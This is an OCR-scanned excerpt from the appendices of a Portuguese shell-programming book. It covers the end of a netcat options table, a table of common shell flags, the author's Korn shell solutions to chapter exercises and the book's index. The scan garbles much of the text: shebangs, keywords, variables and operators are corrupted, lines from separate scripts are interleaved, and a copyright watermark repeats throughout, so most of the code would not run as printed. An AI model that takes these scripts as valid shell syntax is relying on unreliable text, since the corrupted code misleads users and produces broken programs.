lll8lldllndo salda e enoe lllmbém para a rede• 
---
-1 
Coloca em modo de 'escuta' (listen) 
-n 
Recebe a faz conaxõea apenas em lonnalo numértco (IP) 
-p 
Define a porta local em uso 
-q seg Termina apele asperar seg segundoe depois do fim da tral18111isailo 
-u 
ModoUOP 
-w seg Encerra transmissão após esperar seg segundos (time-ou~. 
O netcat é isso tudo que você viu, porém ele tem um inconveniente. Se 
alguém estiver "snirfando" a sua rede, poderá ver o que você está fazendo 
por ser tudo feito em texto plano. Se você precisar se resguardar quanto a 
isso, use o cryptcat, disponível em http://sourceforge.net/project/showfi-
les.php?group_id=11983, que permite ligar o modo criptografado. 
- ~ -
39. Essa opção funcionará somente se, em tempo de compilação do nc, for usada a opção GA-
PING_SECURITY _HOLE. 
Apêndice 6 
Significado das Opções 
mais Frequentes no Shell 
Opção 
Significado 
Exemplos 
t,nexa (a saícla em um arquivo) 
tee -a 
·a 
todos (611) 
ts -a 
Qonta 
grep -c 
·C 
Qommando 
sh -c command 
Qiretório 
cpio -d 
-d 
Qelimitador 
cut -ddellmiter 
-e 
.§:xpande (algo, p.ex. <tab> para <espaços>) 
,5xecute 
Lê a entrada do comando de um arquivo 
fgrep ·f file 
-f 
(file) 
rm -f 
.Eorça uma condição (execução não interativa) 
cut -fieldnumber 
Especifica o número de um campo (Field) 
·h 
Imprime um cabeçalho (!:!eader) 
pr-hheader 
-i 
!gnora maiúscula/minúscula 
grep -i 
Coloca a instrução em medo jnterativo 
rm ·i 
Formato !,oogo de saída 
ls -1, ps-l 
·I 
!,;ista os nomes de arquivos 
grep ·I 
Conta as !,inhas 
WC ·I 
_bQginname 
rlogin ·lname 
·L 
Siga o !,ink simbólico 
cpio ·L, ls -L 
Em modo ~ão interativo 
rsh - n 
-n 
Processamento ttumérico 
sort -n 
520 
Mt 
cvrn 
r to 
to 
s 
Significado das Opções mais Frequentes no Shell 
521 
-o 
Nome do arquivo de saída r(Qutput) 
1 cc -o, sort -o 
-p 
Número do .Erocesso 
ps -p pid 
Caminho (.Eath) 
mkdir -p 
Rápido (Quíck) 
fínger-q 
= 
-q 
Quieto 
I who -q 
B.ecursivo 
rm -r 
-r 
Em ordem B.eversa 
sort -r 
Diretório B.aíz 
ls -r 
-R 
Processa diretório Recursivamente 
1 chmod -R, rs -R 
cat -s 
-s 
.Qilencioso quanto aos erros 
lp -s 
·I 
Específica o caractere de Tabulação ( <TAB>) 
sort -ttabcha:;=== 
.!,!níco (produz uma única saída) 
sort -u 
-u 
Sem Ir para o buffer (!!nbuffered) 
cat -u 
-v 
Prolixo Q!erbose), o oposto a -q 
c pio -v, ta r - v, 
lnYerte a funcionalidade 
grep -v 
Especifica o tamanho {Y:tidth) 
pr -w, sdiff -w 
-w 
No formato largo (Y:tíde) 
ps -w 
Conta palavras (Words) 
wc-w 
-y 
Responde sim (Yes) para todas as perguntas. 
shutdown -y 
~latona com d retbS · to aiS 
·Apêndice 7 
Resolução dos Programas 
A partir deste ponto teremos a proposta de resolução dos 
programas encontrados nos exercidos ao final de cada 
capítulo. Não são "as respostas certas" mas simplesmen-
te a solução que dei, dentre muitas propostas de resolu-
ção dos programas. 
Capítulo 3 
l . 
li ! /bin/J:sh 
# 
M capitulo 3 exercicio 1 
M 
" ." tel efones 
2. 
#! /bi n/J:sh 
jj 
i 
Capitulo 3 execcicio 2 
li 
fgrep " (" $1 " ) " t.elefones 
3. 
# ! /bin /ksh 
# 
~ Capitulo 3 E:xercici o 3 
I 
522 
Mate ria com d r bs a;.Jtora!S 
i ;.. "l'Mgi c a " deste exerci c io eh matar 
i os n -
1 parametros antes do ultimo 
§ e:r-. t..ao ve jamos : 
Resolução dos Programas 
523 
Para0Lixo•$ ({$N -
1)) 
~Podia ser: ParaOLi xo• ' expr ParaOLixo -
1 · 
Shift $Par a OLixo 
j 
~..s 2 ú l i:: itni'Hs linhas, pod a m so r sub.'$ti t u i dtts por : shift $ ( ( $@ -
1 ) ) 
echo $1 
4 . 
M!/bin/k.s:h 
f 
j 
Capitul o 3 ~Xêrcicio 4 
!! 
Oata= ' dat~ " +! b 
~e "
' 
Hho 1 grep ... v " $Da ta" 
Capítulo 4 
1. 
11 !/ bin/k>h 
!i 
i 
Capitul o 4 exercí cio 1 
~ 
ii 
Horas em hh 
ap;;.am 
# 
Hinutos em mm 
! 
am ou pm em ap 
if ( " $hh" - gt 12 
then 
fi 
hh= · expr ~hh
- 12 · 
ap•pm 
echo $hh : $mm $ap 
éXi t. 
2 . 
! !/bin/ksh 
8 
! 
Capitul o 4 exercicio 2 
li 
if 
then 
"$1# .. - ne 2 ) 
Recebi 2 parame tros? 
Mate 
com d r~1tos autCYa s 
524 Programação Shell Linux 
echo "uso: $0 <comandos do sed> <arquivo a ser editado>" 
exit 
li 
if la 12 1>/dav/null 2>&1 
th~n 
if sed Sl $2 >/tmp/SS 2>/dev/null 
then 
echo sed bem sucedido 
mv / tmp/$$ $2 
e;:i~ 
else 
O sed foi bem sucedido? 
echo Houve er.ro na passagem de paa:ametros para o seci . 
rm / t mp/$S 2>/dev/null 
exit 2 
li 
c l se 
echo Ji..rquivo $2 nao existe 
exit. 3 
li 
3. 
~ ! /bin/k•h 
!I 
# 
Capitulo 4 exercício 3 
;; 
Hora= · dat.e + H I " 
case $Hora in 
O? I 1(01] ) echo Bom Dia 
esac 
exit. 
1 (2-7 ) 
Capítulo 5 
1. 
ª !/bin/ksh 
;; 
echo Boa 'rarde 
i ; 
echo Boa Noite 
D Capitulo 5 exercicio 1 
;; 
Mate 
com d r~1tos autCYa s 
if [ $i -ne 2 
then 
Resolução dos Programas 
525 
# 
Recebi 2 parame t ros? 
echo 
" U~o : $0 <No. OL ou nome do si te> <Norne Arq . de rnail> .. 
exit. 1 
li 
!f 
Vou testa.r se o .$1 eh numer1.co (No. Ot) ou nao (Nome da maqui na) 
ti 
s e ra que exite a OL ou Maquina i nformada? 
i f 
expr $1 + 1 > / dev/null 2>/dev/null 
then 
Reg= ~ g.rep " "'$1" ArqOLs ' 
í# Pesquis" ndo No. OL no i nicio do registro 
if 
[ ! " $Reg" l 
then 
li 
echo Nao c onheco QL;$1 
exit 2 
Haqui na='echo ''SReg'' I cut - fz · W Sem aspas~ $Reg perde as <tab> 
el se 
Req•'g r ep " SI 
"ArqOL.s· 
W Pesquis ando <tab><maquina><tab> 
i f 
( ! ".$Reg" 
then 
echo Nao conhece Si~e=Sl 
exit 3 
fi 
li 
Haqui nA=$1 
Opers= ' echo " $Re9" I cut -f3 ' 
# 
E o arquivo? 
Ser ah que ele exist:e? 
i f ls $2 > /dev/null 2> /dev/nul l 
ij Poderia <b . f azer: if 
then 
for Oper 
do 
mail 
don e 
exit 
li 
echo $2 no o 
ex i c 4 
Capítulo 6 
1. 
~ ! /bin/ksh 
11 
in $Ope.r~ 
.$0pcr @$Maquina < $2 
existe neste di.retorio 
N Capitulo 6 exercic~o 1 
- f $2 1 
Mate ria com d r bs a;.Jtora!S 
526 Programação Shell Linux 
il 
if 
[ H -ne l 
then 
i 
Recebi 1 paramet ro? 
echo "Uso: $0 <Nome do Arquivo com conteudo do e- mail>" 
exit 1 
fi 
# 
Serah que o arq ui vo exis~e? 
if ls $1 > /dev/nu ll 2>'1 
then 
cat A.rqOLS 
whil e rl!:ad lixo Haquina Oper!!l 
do 
mail 
echo $0pers 1 cu< -fl -d" " @$1·taquina < $1 
done 
el se 
fi 
echo $1 nao existe neste diretocio 
er.it 2 
iHfff 
O ul t i mo i.f p oderia (e deveria} .'3er escrito assim: 
Jfff 
i! 
M 
if I - f "$1' l 
i 
çhen 
M 
ca~ ArqOLs 
! 
while read lixo t•laqui na Oper lixo 
il 
do 
8 
1nail $Oper@$Haquina < $1 
i 
done: 
i 
el::;e 
i 
echo $1 nao éxisté ne3Ce direto~io 
i# 
é Xi t:. 2 
11 
fi 
ll##ll##i~####fi####i##~ll##~##ill##l#fiii###J#fil######l##i###I###J#fill# 
2 . 
il ! /bin/ksh 
11 
i 
Capi ~ulo 6 Exe r c í cio 2 
~ 
!! 
cl ea.r 
echo " 
Mate ria com d r bs a;.Jtora!S 
while true 
do 
TRANSMISSAO DE ARQUIVOS 
....................... 
1 - Maquina . . . 
2 -
Login 
3 - Senha 
4 - Arquivos a serem transmitidos 
Informe os dados acima ... " 
tput cup 5 32 
read maq 
Resolução dos Programas 
527 
if fgrep Smaq /etc/hosts > /dev/null i Existe no /etc/hosts? 
then 
break 
else 
tput cup 21 25 
echo -e "Maquina nao definida no arquivo de hosts\07"'•i \07 da ' 
BEEP 
fi 
done 
read 
tput cup 21 25 
echo 
11 
continue 
tput cup 7 32 
read acesso 
tput cup 9 32 
stty - echo 
read senha 
stty echo 
Arquivos= 
while true 
do 
tput cup 13 21 
read Arquivo 
if [ ! "SArquivo" 
i 
Soh para esperar ate ' teclar <ENTER> 
i Limpei a linha 
40. A opção~ é necessária somente em ambiente LINUX. Nos outros sabores de UNIX essa opção 
não deve ser usada. 
526 Programação Shell Linux 
then 
t put cup 17 16 
e-cho -e "l''inaliza e-nt.rada de arqui vos {s/n) \c .. 
road Sair 
if ( .. $SaLr'' 
~ s 1 
then 
b~eak 
else 
tput cup 17 16 
echo " 
continue 
fi 
h 
if ls $Ar<! Uivo > / dev/null 2>&1 
then 
tput cup 21 0 1 
.~rquivos• " $Arquivos · echo $Arquivo' '' 
tput. bo1d 
echo $Arquivos 
tput. .sqrO 
ê'lse 
fi 
tput cup 17 16 
@cho "Arquivo n a o f!;,istt! . . . •• 
read 
tput cup 17 16 
echo .. 
t.put cup 13 21 
echo " 
donc 
tput. cup 19 16 
'tPU'& smso 
echo "Aguarde .:1 transmisstlO 
fot trans in $Arquivos 
do 
ftp - iv!l " $maq" << fimftp 
>> / tmp /$ $ 
us~r .. $aco!:sso" "Sse!:nh a " 
bin 
put "$t.rans'' 
bye 
fimf tp 
done 
tpu,; cup 23 16 
echo "Fim de Transmissao ... . Tecl e <ENTER> 
Mate 
com d r~1tos autCYa s 
Resolução dos Programas 
529 
read 
tput s9rO 
c l ear 
Capítulo 7 
1. 
1 ! /bin/ksh 
~ 
J 
Capitulo 7 exercicio 
!i 
if { H 
- lc I 
then 
!i 
Recebt pelo menos 1 parametro? 
echo ''Uso: $0 <Nomes dos Arqu i vos a Delct.Ar> . 
fi 
Obs . Vale metacaracteres como arqs"'" 
@'Xit 1 
if ( ! " $1·1AXFILES" 
t.hen 
MAXFILES =lO 
n 
Ot.d=' l s $• 2> / dev/null I t-!C - 1 ' 
if 
( " IQtd" -eq O 1 
then 
n 
~cho Nao ha arquivos a 
~erem deletados 
e:-:i t 2 
it [ "$Qtd" -le " $M.>.X FILES" I 
then 
fi 
echo ··oeverid fazer rm ' echo $,.. . .. 
exit 
if { " $Qtd" - gt 1 1 
thcn 
echo - e "El-:i.stem SQtd Arquivos a dele ta r ... \c" 
el se 
echo -e ''So exist e 1 o1rquivo .a delet. .. 'lr . .. \c .. 
fi 
echo 
- é 
" 
Posso r<:!mover? (S/n) \c '' 
read s n 
if 
"$s:1,. ! = n ] 
then 
Mate 
com d r~1tos autCYa s 
530 Programação Shell Linux 
fi 
2. 
echo "Deveria fazer rm -f ' e cho $" . , 
exit 
d) 
H!/usr /bi n/ksh 
f 
~ Esce pr ograltlD. chama o c7c2 . 1 que c oletara os dados necessar ios, 
i 
devolvendo- os a es~o , que procedera a ínchtsao, cxclusao ou 
# 
al~cracao necessaria . 
~ 
export Opc::=O 
>~hile [ " $0pc" -lt 1 -o SOpc -ge 4 I 
do 
c l ea.r 
echo - e 
+-----------------------------------------------------+ 
Programas de Manutencao de ArqOLs 
+-----------------------------------------------------+ 
OPCAO 
ACAO 
1 
Inclui OL em A.rqOL~ 
2 
exclui OL de ArqOLs 
3 
Alt era OL em ArqOLs 
4 
Termina 
E:ntro Com a Opcao OêseJada: \c" 
read Opc 
clone 
if [ $Opc - eq 4 l 
then 
exit 
fi 
Reg;:: 'c7e2 . 1 ' 
echo -e "\n\n 
OL a ser \c" 
case $0pc 
in 
1) echo - n ''incluída '' 
2) echo - n "excluida" 
Mate ria com d r bs a;.Jtora!S 
Resolução dos Programa.s 
531 
· ) echo -n "alterada" 
esac 
echo -e " · ••> SReg \n 
Confirma? (5/n) \c" 
read sn 
if 
[ "Ssn" 
then 
n -o "Ssn" • N ] 
exit 
li 
OLinf•'echo "SReg" 
1 cut -fl · 
case SOpc in 
1) if grep "'SOLinf" ArqOLs > /dev/null 
then 
fi 
echo -e "\n\nJa' existe registro referente aa OL $0Linf" 
read 
exit 1 
echo "SReg" 
>> ArqOLs 
sort ArqOLs > /tmp/ArqOLsSS 
mv -f /tmp/ArqOLsSS ArqOLs 
2 ) 
if grep '"SOLinf" ArqOLs > /dev/null 
then 
grep -v "'SOLinf" ArqOLs > /tmp/ArqOLsS$ 
mv - : /tmp/ArqOLsSS ArqOLs 
else 
fi 
echo -e "\n\nNao existe registro referente aa OL SOLinf" 
read 
exit 2 
3) 
if grep ""SOLinf" ArqOLs > /dev/null 
then 
else 
fi 
grep -v ""SOLinf" ArqOLs > /tmp/ArqOLsSS 
ffiV -! /tmp ArqOLsSS ArqOLs 
echo "SReg" 
>> ArqOLs 
sort ArqOLs > /tmp/ArqOLsSS 
mv /tmp/ArqOLsSS ArqOLs 
echo -e "\n\nNao existe registro referente aa OL SOLinf" 
read 
exit 2 
532 Programação Shell Linux 
esac 
b ) 
11 !/usx/bin/ksh 
!I 
8 
Este prg foi chamado pel o c7e2 para coletar dados necessarios. 
~ 
M 
M 
rotin.os de exclu sao e a l t e r ucao ainda nao for am impl emento.dtlS. 
# 
# 
Repare que os blocos d e programa si~uados ent re chaves, escao com 
8 as sai das redirecionadas para /dev/c~y . que e a saida 
! 
no terminal corrence, isto e, o teJ:minal que voce esta usando . 
H 
el e ar 
echo 
+-----------------------------------------------------+ 
Programas de Manutencao de Arqots 
+-----------------------------------------------------+» 
tpu t c up 8 22 
echo - e "Dados pa.ra \c;: n 
I > /dev/tty 
case $0pç i n 
1) 
echo l nc lusao 
tput cup 11 22 
echo - e "Numero da OL: \c" 
read OL 
tput cup 13 22 
echo -· 
"Nome da t-taquin .. 1: \c '" 
read t•laq 
i = O 
••hile [ $i - 1 • 7 
do 
Lin=· e~pr 15 + $i I 2 
\ ~ 2 ' 
Col = ' expr 22 + $i ~ 2 \ * 30 ' 
i= ' e >:pr s~ + 1 ' 
t put c up SLin SCol 
echo - e "OperadoiH : \c" 
r ead Oper 
Mate ria com d r bs a;.Jtora!S 
esac 
if 
f ! n$0per" 
then 
break 
fi 
Oper s=$0por s$Oper• 
done 
l > /dev/ttY 
echo "$0L 
exit 
$Naq 
>Opers " 
2) 
echo .. rot.1na nao i mplementeda " > /dev/tty 
exit 
J ) 
echo "rotina nao implement eda" > /dev/tty 
exit 
Capítulo 8 
1. 
i ! / bi n/ksh 
ii 
I 
Capitul o e -
Exerci cio 1 
8 
Resolução dos Programas 
533 
Brro O 
# f! 
#I Este nome e h porque a funcao pode ser usada para 
ff H # 
~rros d~ critica 
if 
" $1" - lt 2 - o \( · s~ · - gt 3 \) ] 
then 
echo " Uso: $0 <!4ensagem> <No . Linha> t <No . Coluna> J •· 
exit 1 
li 
if 
( "$K" -eq 3 ] 
then 
e l .se 
Len~
· expr leng th ~ st n • 
C• 'expr " ( .. 80 -
n$Len .. n ) w I 2 " 
li 
tput cup $2 $C 
ec:ho - e "$!\ 01\ c " 
read a < /dev/tty 
Mate 
com d r~•tos autCYa s 
índice Remissivo 
A 
Bourne-Again Shell 91 
Bourne Shell 91 
a 115 
break 363 
ação 340 
brute force 512 
apóstrofos 94 
c 
ARGC 371 
argumento inicial 164 
c 116 
ARGV 371 
Campos 341 
arrays 355, 363 
case .195. 
aspas 94 
cal 113, 229, 507 
autoindent 261 
chaves 160 
awk 193, 341 
cifrão ($) 94 
B 
clear 221 
código de retorno 214 
background lli 
código de retorno (S?) 119. 262 
barra invertida 94 
col 222 
Bash 1.5.5. 193, 241 
comando nulo 253 
bash 91, 512 
contador genérico 373 
bc 145 
continue 363 
BEGIN 344 
Controle de Fluxo 359 
blocos de instruções 206 
crase(') 94 
M I 
cvrn r to 
to 
s 
536 Programação Shell Linux 
Criar Variáveis 158 
expressão regular 1 08 
csh 92 
Expressões Regulares .34fi 
C Shell 92 
Expressões Rei acionais 344 
cut 130 
F 
D 
fgrep 122 
d 115 
Fim da linha ($) 1 05 
default 131 
for 203. 362 
delimitador 132 
Forma Expressa 144 
dev 101 
Formando Padrões 344 
diretório pai 165 
ftp 99, 296 
dois pontos 253 
funcao 299 
dois pontos ~) 21 O 
G 
dot 254 
E 
GNU 118 
grep 122 
ed 103 
gsub 356 
egrep 122 
H 
elif 181 
e lógico 189 
head 138. 230 
else 176 
here document 1.55 
END 344 
here string 229 
Entrada Padrão 98. 
here strings 1.55 
EOF 350 
home directories 137 
eval 289 
home directory 12fi 
exit 296, 363 
Expansão de chaves 272 
l 
export 249 
i 116 
Exportar 2 48 
if 176 
expr 144 
IFS 209, 229 
M I 
cvm r to 
to 
s 
ignorecase 261 
importar 250 
Indicador de pesquisa (~ 1 04 
Inicio da linha (") 105 
instrução expr 178 
K 
kernel 85 
Korn Shell 91 
ksh 91, 239 
L 
Leiame.txt 81 
lin 222 
logado 213 
loop 202, 218 
M 
mail 100, 230 
MAXFILES 287 
Meta Caracteres 90 
N 
nc 5lli 
net 5lli 
netcat 5lli 
new-line 116 
next 363 
NULL 361 
number 261 
Índice Remissivo 
537 
o 
OFMT 368 
OFS 3fifi 
opção -c 124 
opção -d 131, 134 
opção-f 131 
opção -1 125 
opção -m 217 
opção-n 117 
opção -v 126. 172 
Opção -d 142, 143, 154 
Opção-s 141 
opção -s 134 
Operações Aritméticas 144 
operador -a 189 
operador -o 189 
operador -z 184 
Operadores 354 
Operadores aritméticos 190 
operador lógico 11 202 
operador lógico or 188 
órgão Local 230 
ORS 3fifi 
ou lógico 190 
p 
p 113, lli 
padrão 340 
padrao-acao 3A1 
M I 
cvm r to 
to 
s 
538 Programação Shell Linux 
parâmetros 160 
Saída com print .3fifi 
paste 133 
saída padrão 11 O 
pendurado 177 
scan 5.12 
PIO 90 
script 157 
pípe 121 
script Shell 164 
pípeline 213 
sed 108 
ponto 25! 
Sem Comentários 93 
ponto e vírgula 96 
separador <TAB>, 134 
pontos e vírgulas sucessivos 196 
sh 91 
printf 367 
Shell 85, 157 
Programa add 170 
Shell secundário 96 
programa add 173 
showmode 261 
programa pp 169 
sinais 295 
Programa rem 172 
sinal 295 
prompt secundário 116 
SOD 87 
prompt secundário(>) 206 
stderr 90 
ps 122 
stdin 90 
Q 
stdout 90 
stty 22J. 
q 116 
Substituição (s /I) 106 
quantidade de parâmetros (S#) 262 
SUID 124 
R 
T 
read 241 
Tabela Verdade 189 
Recebendo Parâmetros 371 
tail 230 
redirecionamento 90, 1.55 
test m 
RLENGTH 358 
tput 221' 224 
RSTART 358 
tput blink 222 
s 
tput bold 222, 224 
tput cup 222 
s 109 
tput reset 222 
tput rev 222 
tput sgrO 222 
tput smso 222 
tput smul 222 
tr 136 
trap 295 
trojan 511 
u 
Ubuntu 507 
uname 95, 97 
uniq 153 
UNIX 84 
until 214 
Uso de Variáveis 350 
v 
Valores de Vetores 363 
variáveis 90 
Índice Remissivo 
539 
Variáveis definidas pelo programador 350 
Variáveis Internas 350 
variável $# 161 
variável $* 162 
variável$? 174 
variável $0 161 
variável $a 232 
variável $var 184 
variável var 203 
vetores 363 
vírgula (.) 343 
w 
wget 496, 502 
while 212 
who 101, 130 
X 
xargs 164 
